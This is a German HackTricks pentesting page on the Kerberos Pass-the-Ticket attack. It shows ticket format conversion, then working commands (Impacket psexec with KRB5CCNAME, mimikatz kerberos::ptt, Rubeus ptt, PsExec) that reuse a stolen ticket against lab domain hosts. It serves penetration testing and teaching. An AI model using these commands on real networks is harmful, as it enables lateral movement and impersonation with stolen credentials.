# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Überblick

Bei einem Pass-the-Ticket (PtT)-Angriff verwendet ein Angreifer ein gestohlenes Kerberos-Ticket, um sich als Principal des Tickets zu authentifizieren, ohne das Passwort dieses Kontos zu besitzen. Ein Ticket-Granting-Ticket (TGT) kann zum Anfordern von Service-Tickets verwendet werden, während ein gestohlenes Service-Ticket auf seinen Zieldienst und seinen Gültigkeitszeitraum beschränkt ist.<sup>[[1]](#references)</sup>

Informationen zu Techniken zur Ticketbeschaffung:

- [Tickets aus Windows ernten](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Tickets aus Linux ernten](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Konvertieren von Linux- und Windows-Ticketformaten

Kerberos-Caches liegen unter Linux häufig als MIT-`ccache`-Dateien und unter Windows als `.kirbi`-Dateien vor. `ticket_converter` konvertiert zwischen diesen Formaten anhand eines Eingabe-Tickets und eines Ausgabepfads.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo bietet auch Kerberos-Ticket-Tools unter Windows.<sup>[[3]](#references)</sup>

## Verwenden eines Tickets

Unter Linux setzt du `KRB5CCNAME` auf den Cache und weist einen Impacket-Client an, Kerberos zu verwenden, ohne nach einem Passwort zu fragen:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Unter Windows können Mimikatz oder Rubeus ein `.kirbi`-Ticket in die aktuelle Anmeldesitzung importieren. Verwenden Sie `klist`, um den resultierenden Cache zu überprüfen.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Der Ticket-Import gewährt keine über die im Ticket dargestellten Berechtigungen und die Autorisierungsrichtlinie des Zieldienstes hinausgehenden Privilegien. Abgelaufene, widerrufene, fehlerhafte oder falsch eingeschränkte Tickets können fehlschlagen.<sup>[[1]](#references)</sup>

Einen umfassenderen Kontext zu Kerberos-Angriffen und verwandten Techniken zur Ticket-Beschaffung finden Sie im Kerberos-Angriffsleitfaden von Tarlogic.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket-Beispiele](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos-Angriffstechniken](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
